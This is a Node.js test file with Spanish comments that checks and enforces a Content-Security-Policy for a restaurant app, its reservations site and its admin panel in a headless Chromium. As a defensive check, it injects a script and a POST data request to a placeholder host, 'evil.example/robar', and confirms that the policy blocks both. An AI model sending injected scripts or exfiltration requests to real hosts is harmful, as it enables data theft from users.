/* Content-Security-Policy (25/11, auditoría de seguridad: «falta la CSP en las tres _headers»).
 *
 * La app lleva el JS y los estilos DENTRO del HTML, así que script-src necesita 'unsafe-inline'. Aun así la política corta lo que más importa:
 * un script de fuera, una conexión a un servidor no listado, <object>, <base>, un formulario a otra web, incrustar la app en otra página.
 *
 * Esta prueba hace DOS cosas:
 *   1. Comprueba la política publicada (estructura, sin eval, sin comodines peligrosos, Caddy = _headers, y que CADA servidor al que el
 *      código hace fetch está en connect-src: sacado del código, no de memoria).
 *   2. La APLICA de verdad: sirve app, reservas y panel de admin con SUS cabeceras (test/_servidor-csp.mjs) a un Chromium real y recorre las
 *      pantallas principales (inicio, todas las vistas, TPV y mesa, ventanas, impresión, QR, avisos; web de reservas con su asistente; panel
 *      de admin) exigiendo CERO violaciones de la política y cero errores de JavaScript. Además comprueba que la política MUERDE: un script
 *      y una conexión a un servidor no listado tienen que ser bloqueados (si no, la prueba no probaría nada).
 * La parte con Firebase de verdad (SDK, sesión anónima, sincronización) está en test/emulador/csp-nube.mjs.
 */
import puppeteer from 'puppeteer-core';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { servir, vigilarCsp, leerViolaciones, cabecerasDe, RAIZ } from './_servidor-csp.mjs';
import { semilla } from './_semilla-publica.mjs';

let fallos = 0;
async function caso(n, fn){ try{ const d = await fn(); console.log('✅ ' + n + (d ? '  → ' + d : '')); }catch(e){ fallos++; console.log('❌ ' + n + '\n   ⤷ ' + (e.message || e)); } }
const w = ms => new Promise(r => setTimeout(r, ms));
const leer = f => fs.readFileSync(path.join(RAIZ, f), 'utf8');
const parsear = csp => Object.fromEntries(csp.split(';').map(x => x.trim()).filter(Boolean).map(x => { const [k, ...v] = x.split(/\s+/); return [k, v]; }));
const CSP = {app: cabecerasDe('app')['Content-Security-Policy'], reservas: cabecerasDe('reservas')['Content-Security-Policy'], admin: cabecerasDe('admin')['Content-Security-Policy']};

/* ══ 1. La política publicada ══ */
await caso('Las tres _headers llevan Content-Security-Policy y las demás cabeceras de siempre', () => {
  for(const s of ['app', 'reservas', 'admin']){
    assert.ok(CSP[s], `${s}: falta la CSP`);
    const c = cabecerasDe(s);
    assert.equal(c['X-Content-Type-Options'], 'nosniff'); assert.ok(c['Strict-Transport-Security']);
  }
  for(const s of ['app', 'reservas', 'admin']) for(const [k, v] of Object.entries(cabecerasDe(s))) assert.ok((k + ': ' + v).length < 2000, `${s}: la cabecera ${k} pasa del límite de 2.000 caracteres por línea de Cloudflare Pages`);
  assert.equal(cabecerasDe('app')['X-Frame-Options'], 'DENY'); assert.equal(cabecerasDe('admin')['X-Frame-Options'], 'DENY');
  assert.equal(cabecerasDe('reservas')['X-Frame-Options'], undefined, 'reservas se puede incrustar en la web del restaurante');
});
await caso('Sin eval ni comodines que anulen la política; objetos, base y formularios cerrados; incrustación: app y admin NO, reservas SÍ (https)', () => {
  for(const s of ['app', 'reservas', 'admin']){
    const p = parsear(CSP[s]);
    assert.ok(!/unsafe-eval/.test(CSP[s]), `${s}: 'unsafe-eval' abre eval() a cualquier XSS`);
    for(const d of ['script-src', 'connect-src', 'default-src']){
      for(const v of p[d] || []) assert.ok(!['*', 'https:', 'http:', 'data:', 'blob:'].includes(v), `${s}: ${d} admite «${v}», o sea cualquier origen`);
    }
    assert.deepEqual(p['object-src'], ["'none'"]); assert.deepEqual(p['base-uri'], ["'self'"]); assert.deepEqual(p['form-action'], ["'self'"]);
    assert.deepEqual(p['default-src'], ["'self'"]);
    assert.ok(!(p['script-src'] || []).some(v => /^https?:\/\/(?!www\.gstatic\.com$)/.test(v)), `${s}: script-src admite un origen inesperado`);
  }
  assert.deepEqual(parsear(CSP.app)['frame-ancestors'], ["'none'"]); assert.deepEqual(parsear(CSP.admin)['frame-ancestors'], ["'none'"]);
  assert.deepEqual(parsear(CSP.reservas)['frame-ancestors'], ['https:']);
});
await caso('La CSP de reservas en el servidor propio (Caddy) es EXACTAMENTE la de _headers, y el cloud-init (lo que se pega en Hetzner) la lleva', () => {
  const caddy = leer('servidor/fase1/Caddyfile');
  const m = caddy.match(/Content-Security-Policy "([^"]+)"/);
  assert.ok(m, 'el Caddyfile no pone la CSP');
  assert.equal(m[1], CSP.reservas, 'Caddy y Cloudflare sirven políticas distintas');
  assert.ok(leer('servidor/fase1/cloud-init.yaml').includes(CSP.reservas), 'cloud-init.yaml sin regenerar: python3 servidor/fase1/generar-cloud-init.py');
  for(const bin of ['/tmp/caddybin/caddy', 'caddy']){
    try{
      const out = execFileSync(bin, ['validate', '--config', path.join(RAIZ, 'servidor/fase1/Caddyfile'), '--adapter', 'caddyfile'], {stdio: ['ignore', 'pipe', 'pipe'], cwd: path.join(RAIZ, 'servidor/fase1')}).toString();
      return 'Caddy valida el Caddyfile';
    }catch(e){ if(e.code === 'ENOENT') continue; throw new Error('Caddy rechaza el Caddyfile: ' + String(e.stderr || e.message).slice(-300)); }
  }
  return 'Caddy no está instalado: solo se comparó el texto';
});
await caso('Cada servidor al que el código hace fetch está en connect-src (sacado del código)', () => {
  const casarHost = (host, lista) => lista.some(v => { const m = v.match(/^(?:https|wss):\/\/(.+)$/); if(!m) return false; const h = m[1]; return h.startsWith('*.') ? host.endsWith(h.slice(1)) : host === h; });
  const hostsDe = (fuente, patron) => { const out = new Set(); fuente.split('\n').forEach(l => { if(!patron.test(l)) return; for(const m of l.matchAll(/https:\/\/([a-z0-9.-]+)/gi)) out.add(m[1].toLowerCase()); }); return out; };
  const REDES = /fetch\(|apiBase|REVOKED_LIST_URL *=|PAGOS_WORKER_URL *=|listaModelos|url: *\(|url: *k|translate_a|databaseURL: *"/;
  const IGNORAR = /^(www\.w3\.org|wa\.me|www\.google\.com|console\.|firebase\.google\.com|platform\.openai\.com|aistudio\.google\.com|dashboard\.stripe\.com|buy\.stripe\.com|reservas\.gastrogoan\.com|app\.gastrogoan\.com|mail\.google\.com|outlook\.office\.com|www\.tiktok\.com|maps\.app\.goo\.gl)/;
  const app = new Set(); fs.readdirSync(path.join(RAIZ, 'js')).filter(f => f.endsWith('.js')).forEach(f => hostsDe(leer('js/' + f), REDES).forEach(h => app.add(h)));
  const lista = (parsear(CSP.app)['connect-src'] || []);
  const sin = [...app].filter(h => !IGNORAR.test(h) && !/^(your|tu|el-te|xxxx|casapaco)/.test(h) && !casarHost(h, lista));
  assert.deepEqual(sin, [], 'el código se conecta a servidores que la CSP de la app no permite: ' + sin.join(', '));
  const res = hostsDe(leer('reservagastrogoan.html'), REDES);
  const listaR = (parsear(CSP.reservas)['connect-src'] || []);
  const sinR = [...res].filter(h => !IGNORAR.test(h) && !casarHost(h, listaR));
  assert.deepEqual(sinR, [], 'la web de reservas se conecta a servidores que su CSP no permite: ' + sinR.join(', '));
  return `${app.size} servidores de la app y ${res.size} de reservas, todos permitidos`;
});
await caso('Ningún eval escondido en el código que se publica (new Function, eval, setTimeout con texto)', () => {
  for(const f of fs.readdirSync(path.join(RAIZ, 'js')).filter(f => f.endsWith('.js')).map(f => 'js/' + f).concat(['reservagastrogoan.html', 'admin-panel/plan360.html', 'admin-panel/index.html', 'generador-licencias.html', 'sw.js', 'sw-reservas.js'])){
    const src = leer(f).split('\n').filter(l => !/^\s*(\/\/|\*|\/\*)/.test(l)).join('\n');
    assert.ok(!/\bnew Function\s*\(/.test(src), `${f}: usa new Function (la CSP no permite eval)`);
    assert.ok(!/[^.\w]eval\s*\(/.test(src), `${f}: usa eval`);
    assert.ok(!/set(Timeout|Interval)\s*\(\s*['"`]/.test(src), `${f}: setTimeout/setInterval con texto = eval`);
  }
});

/* ══ 2. La política APLICADA en un navegador real ══ */
const browser = await puppeteer.launch({executablePath: '/opt/pw-browsers/chromium-1194/chrome-linux/chrome', args: ['--no-sandbox'], headless: true});
async function pagina(origen){
  const p = await browser.newPage(); await p.setViewport({width: 1100, height: 900});
  p.errs = []; p.on('pageerror', e => p.errs.push(e.message));
  p.externos = new Set();
  await vigilarCsp(p);
  await p.setRequestInterception(true);
  // Lo externo se aborta (sin red), pero SE ANOTA a dónde quería ir: lo que la CSP deja pasar llega aquí, lo que bloquea ya no.
  p.on('request', r => { let o = ''; try{ o = new URL(r.url()).origin; }catch(e){} if(o && o !== origen && !r.url().startsWith('data:') && !r.url().startsWith('blob:')){ p.externos.add(o); return r.abort(); } r.continue(); });
  return p;
}
const sinViolaciones = async (p, que) => {
  const v = await leerViolaciones(p);
  assert.deepEqual(v, [], `${que}: la CSP bloquea cosas de la app:\n   ` + v.join('\n   '));
  assert.deepEqual(p.errs.filter(e => !/Failed to fetch|NetworkError|network|offline|load failed/i.test(e)), [], `${que}: errores de JavaScript`);
};

const sApp = await servir('app');
const app = await pagina(sApp.url);
await app.goto(sApp.url + '/index.html', {waitUntil: 'domcontentloaded'});
await w(2500);
await app.evaluate(() => {
  const code = 'CSPAPP01';
  localStorage.setItem('gastrogoan_license_v1', JSON.stringify({code, tenantId: ggBizTenantId(code)}));
  localStorage.setItem('gastrogoan_owner_login', JSON.stringify({user: 'casapaco', authKey: 'k'.repeat(24), pinHash: 'h'}));
  localStorage.setItem('gastrogoan_access_session', JSON.stringify({type: 'owner', ts: Date.now()}));
  localStorage.setItem('gastrogoan_owner_pass_prompted', '1');
  localStorage.setItem('gastrogoan_backup_reminder_day', new Date().toISOString().slice(0, 10));
});
await app.reload({waitUntil: 'domcontentloaded'}); await w(2500);
// Para probar un cambio de js/ ANTES de compilar (deploy/ lleva la última compilación): CSP_PARCHE=js/panel.js node test/csp.mjs
if(process.env.CSP_PARCHE){   // CSP_PARCHE=js/panel.js:ggEjecutarAccion,avisosIr
  const [fich, nombres] = process.env.CSP_PARCHE.split(':');
  const src = leer(fich);
  const trozos = nombres.split(',').map(n => { const i = src.indexOf('function ' + n + '('); let d = 0; for(let k = src.indexOf('{', i); k < src.length; k++){ if(src[k] === '{') d++; else if(src[k] === '}' && --d === 0) return src.slice(i, k + 1); } });
  await app.addScriptTag({content: trozos.join('\n')});
}
await app.evaluate(() => {
  document.getElementById('app-splash')?.remove();
  ['netlify-gate', 'license-gate', 'extconn-gate', 'firebase-gate', 'revoked-gate'].forEach(id => document.getElementById(id)?.remove());
  Object.assign(DB.business, {name: 'Casa Paco', netlifySetupDone: true, extConnPromptSeen: true, tourSeen: true, categoryIconHintSeen: true, publicId: 'pubcsp01', ivaPct: 10});
  DB.business.ownFirebase = {apiKey: 'fake', databaseURL: 'https://fake-default-rtdb.firebaseio.com'};
  DB.tables = [{id: 1, name: 'Mesa 1', zona: 'Salón', plazas: 4}, {id: 2, name: 'Mesa 2', zona: 'Salón', plazas: 4}];
  DB.cartas = [{id: 1, nombre: 'Carta', area: 'cocina', secciones: [{id: 10, nombre: 'Principales', platos: [{id: 100, nombre: 'Hamburguesa', precio: 12}, {id: 101, nombre: 'Ensalada', precio: 9}]}]}];
  DB.activeCartaIds = [1];
});

await caso('La app arranca con la CSP: inicio sin violaciones ni errores', async () => { await sinViolaciones(app, 'inicio'); });
await caso('Recorre TODAS las pantallas de la app con la CSP puesta', async () => {
  const vistas = await app.evaluate(() => [...document.querySelectorAll('[id^="view-"]')].map(e => e.id.replace('view-', '')));
  assert.ok(vistas.length > 20, 'pocas vistas encontradas: ' + vistas.length);
  let n = 0;
  for(const v of vistas){
    await app.evaluate(v => { try{ navigate(v, true); }catch(e){ console.error('navigate', v, e && e.message); } }, v);
    await w(220); n++;
  }
  await sinViolaciones(app, 'pantallas');
  return n + ' pantallas';
});
await caso('TPV: abrir una mesa y tomar nota, ventanas, aviso de la campana (antes new Function), QR de mesa e impresión por el iframe', async () => {
  await app.evaluate(() => { navigate('tpv', true); });
  await w(500);
  await app.evaluate(() => { try{ openTableOrder(1); }catch(e){ console.error(e); } });
  await w(700);
  await app.evaluate(() => { closeModal && closeModal(); });
  // El aviso de la campana ejecuta su acción de texto (avisosIr). Con un CLIC REAL (el evaluate() de Puppeteer se salta el bloqueo de eval): antes era
  // new Function() y con la CSP no hacía nada; ahora es un controlador en línea.
  await app.evaluate(() => { window.__ok = false; document.body.insertAdjacentHTML('beforeend', `<button id="csp-aviso" style="position:fixed;left:10px;top:10px;z-index:99999;width:80px;height:40px" onclick="avisosIr(&quot;window.__ok = true; navigate('home')&quot;)">ir</button>`); });
  await app.click('#csp-aviso'); await w(400);
  assert.equal(await app.evaluate(() => window.__ok), true, 'el aviso de la campana no ejecuta su acción con la CSP (¿vuelve a ser new Function?)');
  await app.evaluate(() => document.getElementById('csp-aviso')?.remove());
  const sw = await app.evaluate(async () => { for(let i = 0; i < 30; i++){ const r = await navigator.serviceWorker.getRegistrations(); if(r.length) return r.length; await new Promise(x => setTimeout(x, 200)); } return 0; });
  assert.ok(sw >= 1, 'el service worker de la app no se registra con la CSP (worker-src)');
  const qr = await app.evaluate(() => new Promise(r => { const i = new Image(); i.onload = () => r(i.naturalWidth); i.onerror = () => r(0); i.src = qrImagenUrl('https://reservas.gastrogoan.com/casapaco', 200); }));
  assert.ok(qr >= 100, 'el QR (data: URI) no se pinta con la CSP: ' + qr);
  await app.evaluate(() => { window.__ggSinImprimir = true; try{ printViaBrowser('TICKET DE PRUEBA\nHamburguesa  12,00', 80, 'Ticket'); }catch(e){ console.error(e); } });
  await w(900);
  const marco = await app.evaluate(() => { const f = document.getElementById('gg-print-frame'); return !!(f && f.contentDocument && f.contentDocument.body && f.contentDocument.body.innerText.includes('TICKET DE PRUEBA')); });
  assert.equal(marco, true, 'la impresión por iframe no escribió el ticket con la CSP');
  await app.evaluate(() => { try{ showTableQr(1); }catch(e){ console.error(e); } }); await w(500);
  await app.evaluate(() => { closeModal && closeModal(); });
  await sinViolaciones(app, 'TPV / impresión / QR');
});
await caso('La política MUERDE: un script de otro dominio, una conexión a un servidor no listado, un <object>, un <base> y un iframe ajeno son bloqueados', async () => {
  await app.evaluate(() => {
    const s = document.createElement('script'); s.src = 'https://evil.example/x.js'; document.head.appendChild(s);
    fetch('https://evil.example/robar', {method: 'POST', body: 'datos'}).catch(() => {});
    const o = document.createElement('object'); o.data = 'https://evil.example/o.swf'; document.body.appendChild(o);
    const fr = document.createElement('iframe'); fr.src = 'https://evil.example/'; document.body.appendChild(fr);
    const bs = document.createElement('base'); bs.href = 'https://evil.example/'; document.head.appendChild(bs);
    const f = document.createElement('form'); f.action = 'https://evil.example/post'; document.body.appendChild(f); try{ f.requestSubmit ? f.requestSubmit() : f.submit(); }catch(e){}
  });
  // evaluate() de Puppeteer se salta el bloqueo de eval; un <script> de la página no: así se ve lo que de verdad vería un atacante.
  await app.addScriptTag({content: "try{ new Function('return 1')(); window.__evalPermitido = true; }catch(e){ window.__evalPermitido = false; }"});
  await w(700);
  const v = (await leerViolaciones(app)).join('\n');
  for(const d of ['script-src', 'connect-src', 'object-src', 'frame-src', 'base-uri'])
    assert.ok(new RegExp(d).test(v), `la política NO bloqueó ${d}: la prueba no demostraría nada.\n` + v);
  assert.equal(await app.evaluate(() => window.__evalPermitido), false, 'la CSP deja ejecutar eval/new Function');
  assert.ok(![...app.externos].some(o => /evil\.example/.test(o)), 'algo llegó a evil.example: ' + [...app.externos].join(','));
  app.violaciones.length = 0; await app.evaluate(() => { window.__csp.length = 0; });
});
await caso('La app no pidió nada a un origen que no esté en la política (lo externo que intentó, anotado)', async () => {
  const fuera = [...app.externos].filter(o => !/evil\.example/.test(o));
  const permitido = o => { const h = new URL(o).hostname, proto = new URL(o).protocol; const todo = [...(parsear(CSP.app)['connect-src'] || []), ...(parsear(CSP.app)['script-src'] || []), ...(parsear(CSP.app)['frame-src'] || []), ...(parsear(CSP.app)['img-src'] || [])]; return todo.some(v => { const m = v.match(/^(?:https|wss|http|ws):\/\/(.+)$/); if(!m) return v === 'https:' && proto === 'https:'; return m[1].startsWith('*.') ? h.endsWith(m[1].slice(1)) : h === m[1]; }); };
  const mal = fuera.filter(o => !permitido(o) && o !== 'null');
  assert.deepEqual(mal, [], 'la app intenta conectar a: ' + mal.join(', '));
  return fuera.join(', ') || 'nada';
});
await app.close(); await sApp.close();

/* ── Web de reservas ── */
const sRes = await servir('reservas');
const res = await pagina(sRes.url);
await res.goto(sRes.url + '/casapaco', {waitUntil: 'load'});
await w(1500);
await caso('Web de reservas: el asistente (reservar, pedir, menú, carta) funciona con la CSP, y el service worker se registra', async () => {
  await res.evaluate(s => {
    window.DB = DB = s; window.db = db = {ref: () => ({on(){}, off(){}, once: () => Promise.resolve({val: () => null}), set: () => Promise.resolve(), transaction: () => Promise.resolve({committed: true, snapshot: {val: () => 0}})})};
    businessInfoLoadedOnce = true; renderHeader(); currentTab = null; renderApp();
  }, semilla());
  await w(500);
  for(const tab of ['reserva', 'takeaway', 'delivery']){ await res.evaluate(t => { currentTab = t; renderApp(); }, tab); await w(350); }
  await res.evaluate(() => { currentTab = 'takeaway'; renderApp(); }); await w(300);
  await res.evaluate(() => { const d = document.querySelector('.dc-main, .dc'); if(d) d.click(); }); await w(300);
  await res.evaluate(() => { try{ openMenuModal(1); }catch(e){ console.error(e); } }); await w(400);
  const sw = await res.evaluate(async () => { for(let i = 0; i < 30; i++){ const r = await navigator.serviceWorker.getRegistrations(); if(r.length) return r.length; await new Promise(x => setTimeout(x, 200)); } return 0; });
  assert.ok(sw >= 1, 'el service worker de reservas no se registra con la CSP (worker-src)');
  await sinViolaciones(res, 'reservas');
  return 'service worker: ' + sw;
});
await caso('Web de reservas: la política muerde igual (script y conexión ajenos, y la app NO se puede incrustar en otra web)', async () => {
  await res.evaluate(() => { const s = document.createElement('script'); s.src = 'https://evil.example/x.js'; document.head.appendChild(s); fetch('https://evil.example/r').catch(() => {}); });
  await w(500);
  const v = (await leerViolaciones(res)).join('\n');
  assert.ok(/script-src/.test(v) && /connect-src/.test(v), 'no bloquea lo ajeno:\n' + v);
  res.violaciones.length = 0;
  // Incrustada en OTRA página (la web de un restaurante): tiene que cargar. La página que la contiene es otro origen (about:blank / otro puerto).
  const incrustar = async url => {
    const cont = await browser.newPage();
    await cont.setContent(`<!doctype html><iframe id="f" src="${url}" style="width:600px;height:600px"></iframe>`, {waitUntil: 'domcontentloaded'});
    await w(1800);
    const hijo = cont.frames().find(f => f !== cont.mainFrame());
    const r = hijo ? hijo.url() : '';
    await cont.close();
    return r;
  };
  // (La incrustación de reservas se comprueba por la política —frame-ancestors https:, sin X-Frame-Options—: el navegador solo la deja si la página que
  // incrusta es https, y este servidor de pruebas es http.)
  const sApp2 = await servir('app');
  const bloqueada = await incrustar(sApp2.url + '/index.html');
  await sApp2.close();
  assert.ok(!bloqueada.startsWith(sApp2.url), 'la app SÍ se puede incrustar en otra web (clickjacking): ' + bloqueada);
});
await res.close(); await sRes.close();

/* ── Panel de admin ── */
const sAdm = await servir('admin');
for(const pag of ['index.html', 'plan360.html', 'app.html']){
  const adm = await pagina(sAdm.url);
  await caso(`Panel de admin (${pag}): carga con la CSP sin violaciones`, async () => {
    await adm.goto(sAdm.url + '/' + pag, {waitUntil: 'domcontentloaded'});
    await w(1800);
    await sinViolaciones(adm, 'admin ' + pag);
  });
  await adm.close();
}
await sAdm.close();

await browser.close();
console.log(fallos ? `\n❌ ${fallos} fallos` : '\n✅ la CSP está puesta, es estricta y la app, la web de reservas y el panel funcionan con ella');
process.exit(fallos ? 1 : 0);
